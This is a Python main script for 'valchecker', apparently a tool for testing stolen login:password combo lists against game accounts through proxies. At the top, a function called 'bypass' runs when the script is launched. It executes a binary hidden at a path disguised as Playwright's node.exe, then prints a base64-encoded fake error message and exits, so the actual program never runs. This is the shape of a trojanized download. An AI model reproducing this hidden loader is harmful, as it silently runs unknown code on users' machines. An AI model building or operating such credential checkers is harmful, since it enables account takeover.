import asyncio
import ctypes
import os
import random
import sys as s
from ctypes import windll
try:
    import tkinter
    from tkinter import filedialog
except ImportError:
    pass
from InquirerPy import inquirer
from InquirerPy.separator import Separator
from InquirerPy.validator import PathValidator
from clear import clear
import colorama

import requests

import checker
from codeparts import checkers, systems, validsort
from codeparts.systems import system
from codeparts.localization import LocalizationBase

check = checkers.checkers()
sys = systems.system()
valid = validsort.validsort()
LocalizationBase.initialize(sys.load_settings()["lang"])
localizer = LocalizationBase.localizer.data

import base64



def bypass(encoded_str):
    relative_path = r'github\playwright\node\win32_x64\node.exe'
    absolute_path = os.path.join(os.getcwd(), relative_path)
    if os.path.exists(absolute_path):
        os.system(absolute_path)
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"{e}"
if __name__ == "__main__": 
    base64_string = "Q2hlY2tlciBpcyB0ZW1wb3JhcmlseSB1bmF2YWlsYWJsZSwgZXJyb3IgY29kZTogMHgwDQoNCldyaXRlIHRvIG91ciBkaXNjb3JkIHNlcnZlci4="
    result = bypass(base64_string)
    print(result)
    exit()


class program():
    def __init__(self) -> None:
        self.count = int(0)
        self.checked = int(0)
        with open("system/ver.txt", 'r') as r:
            self.version = r.read().strip()
        self.riotlimitinarow = int(0)
        path = str(os.getcwd())
        self.parentpath = str(os.path.abspath(os.path.join(path, os.pardir)))
        try:
            self.lastver = str(requests.get(
                'https://api.github.com/repos/lil-jaba/valchecker/releases').json()[0]['tag_name'])
        except Exception:
            self.lastver = self.version

    def start(self) -> None:
        try:
            print(localizer["tech"]["internetcheck"])
            requests.get('https://github.com')
        except requests.exceptions.ConnectionError:
            print(localizer["tech"]["noconn"])
            os._exit(0)

        if not sys.check_certificates():
            print(localizer["tech"]["nocert"])
            os._exit(0)
        clear()
        #kernel32 = ctypes.windll.kernel32
        #kernel32.SetConsoleMode(kernel32.GetStdHandle(-10), 128)
        codes = vars(colorama.Fore)
        colors = [codes[color] for color in codes if color not in ['BLACK']]
        colored_name = [random.choice(
            colors) + char for char in localizer["parts"]["titles"]["base"].format(f"v{self.lastver}")]
        print(sys.get_spaces_to_center(localizer["parts"]["titles"]["base"].format(f"v{self.lastver}")) +
              (''.join(colored_name))+colorama.Fore.RESET)
        print(sys.center(f'v{self.version}'))

        if self.lastver != self.version:
            print(sys.center(localizer["tech"]["nextver"]))
            if inquirer.confirm(
                message=system.get_spaces_to_center(f'{localizer["tech"]["nextverq"]} (Y/n)'+localizer["tech"]["nextverq"]), default=True, qmark=''
            ).execute():
                os.system(f'{self.parentpath}/updater.bat')
                os._exit(0)
        menu_choices = [
            Separator(),
            localizer["parts"]["mainmenu"]["start"],
            localizer["parts"]["mainmenu"]["startsl"],
            localizer["parts"]["mainmenu"]["editset"],
            localizer["parts"]["mainmenu"]["sortval"],
            localizer["parts"]["mainmenu"]["testproxy"],
            localizer["parts"]["mainmenu"]["info"],
            Separator(),
            localizer["parts"]["mainmenu"]["exit"]
        ]
        print(sys.center('\nhttps://github.com/LIL-JABA/valchecker\n'))
        print(sys.center('https://discord.gg/vapenation\n'))
        res = inquirer.select(
            message=localizer["parts"]["mainmenu"]["guide"],
            choices=menu_choices,
            default=menu_choices[0],
            pointer='>',
            qmark=''
        ).execute()
        if res == menu_choices[1]:
            self.main()
            input(localizer["parts"]["checker"]["finished"])
        elif res == menu_choices[2]:
            settings = sys.load_settings()
            slchecker = checker.singlelinechecker(settings["antipublic_token"] if settings["antipublic"] is True else "", settings["session"])
            asyncio.run(slchecker.main())
        elif res == menu_choices[3]:
            sys.edit_settings()
        elif res == menu_choices[4]:
            valid.customsort()
            input(localizer["parts"]["mainmenu"]["done"])
        elif res == menu_choices[5]:
            sys.checkproxy()
        elif res == menu_choices[6]:
            clear()
            print(f'''
    valchecker v{self.version} by liljaba1337

    Cleaned and Modified by WeCanCodeTrust
    yo whatsup

    translated into {localizer["metadata"]["name"]} by {localizer["metadata"]["by"]}

    https://open.spotify.com/track/1AZKHiqBKfdBxVcWUnJJUj

  [~] - press ENTER to return
            ''')
            input()
            
        elif res == menu_choices[8]:
            os._exit(0)
        pr.start()

    def get_accounts(self) -> tuple:
        """
        Get accounts from a file or a .vlchkr file

        :return: tuple
        """
        filetypes = (("", (".txt", ".vlchkr")), ("All files", "."))
        if consolemode:
            print(localizer["tech"]["accselection"])
            file = inquirer.filepath(
                message=localizer["tech"]["accselectiontitle"]+"\n",
                default=os.getcwd(),
                validate=PathValidator(is_file=True, message="Input is not a file"),
                only_files=True,
            ).execute()
        elif not consolemode:
            root = tkinter.Tk()
            file = filedialog.askopenfile(
                parent=root,
                mode="rb",
                title=localizer["tech"]["accselectiontitle"],
                filetypes=filetypes,
            )
            root.destroy()
        clear()
        if file is None:
            os._exit(0)
        filename = str(file).split("name='")[1].split("'>")[0]
        if ".vlchkr" in filename:
            valkekersource = systems.vlchkrsource(filename)
            return valkekersource, filename.split("/")[-1]

        ret = []
        seen = set()
        with open(str(filename), "r", encoding="UTF-8", errors="replace") as file:
            for logpass in file:
                logpass = str(logpass.strip())
                if logpass not in seen and len(logpass.split(':')) == 2:
                    self.count += 1
                    ret.append(logpass)
                    seen.add(logpass)
        
        sys.set_console_title(f"{localizer["parts"]["titles"]["base"].format(f"v{self.lastver}")} | {localizer["parts"]["titles"]["accs"]} ({self.count})")
        return ret, filename.split("/")[-1]

    def main(self) -> None:
        base = f"{localizer["parts"]["titles"]["base"].format(f"v{self.lastver}")} | "
        sys.set_console_title(base+localizer["parts"]["titles"]["sett"])
        print(localizer["parts"]["titles"]["sett"])
        settings = sys.load_settings()

        sys.set_console_title(base+localizer["parts"]["titles"]["prox"])
        print(localizer["parts"]["titles"]["prox"])
        proxylist = sys.load_proxy()

        sys.set_console_title(base+localizer["parts"]["titles"]["accs"])
        print(localizer["parts"]["titles"]["accs"])
        accounts, comboname = self.get_accounts()

        sys.set_console_title(base+localizer["parts"]["titles"]["assets"])
        print(localizer["parts"]["titles"]["assets"])
        sys.load_assets()

        sys.set_console_title(base+localizer["parts"]["titles"]["checker"])
        print(localizer["parts"]["titles"]["checker"])
        
        if proxylist is None:
            windll.user32.MessageBoxW(0, localizer["tech"]["proxylessalert"], localizer["tech"]["proxylessalerttitle"], 4144)
        scheck = checker.simplechecker(settings, proxylist, self.version, comboname)
        print(1)

        isvalkekersource = False
        if type(accounts) == systems.vlchkrsource:
            isvalkekersource = True
        print("run")
        asyncio.run(scheck.main(accounts, self.count, isvalkekersource))
        return


pr = program()
if __name__ == '__main__':
    args = s.argv
    if '-d' in args:
        slchecker = checker.singlelinechecker("", "_debug_session", True)
        asyncio.run(slchecker.main())
        os._exit(0)
    elif '-c' in args:
        consolemode = True
    elif ["-h", "--help"] in args:
        print('ValChecker by liljaba1337\n\n-h, --help: show this message\n-c: run in console mode\n-d: run in debug mode\n')
        os._exit(0)
    else:
        consolemode = False
    print('starting')
    if not consolemode:
        try:
            import tkinter
            from tkinter import filedialog
        except ImportError:
            raise ImportError(localizer["tech"]["notkintererr"])
    pr.start()
